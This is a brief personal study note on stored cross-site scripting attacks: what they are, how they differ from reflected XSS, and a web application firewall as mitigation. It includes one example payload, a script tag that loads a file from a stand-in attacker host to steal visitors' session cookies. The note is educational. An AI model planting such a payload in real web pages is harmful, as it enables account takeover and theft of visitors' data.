#security  #attacks 
what is it
     its an attack that injects malicious code into a vulnerable web application, xss differs from other web attack in that it does not directly target the application itself 
     instead, uses the application to its advantage
to succesfully execute a stored xss attack, a perpetrator has to locate a vulnerability in a web application and then inject malicious script into its server (comment field)

xss example 
     a person realizes that the website doesnt parse out comments and they are stored as regular html and posts this comment 
          <script src="http://hackersite.com/authStealer"> </script>
     from this point on everytime the page is accessed, the html tag will activate a js file, and steals visitors cookies 
     using the session cookie, the attacker can compromise the cisitors account, granting him easy accesss to his personal info and credit card data
     unlike the reflected attack (user has to interact for the attack to commence) the stored attack only needs that the victm visit the compromised web page 

Prevention | mitigation 
     web application firewall (waf) is the most commonly used solution for protection from sxx and web application attacks 
     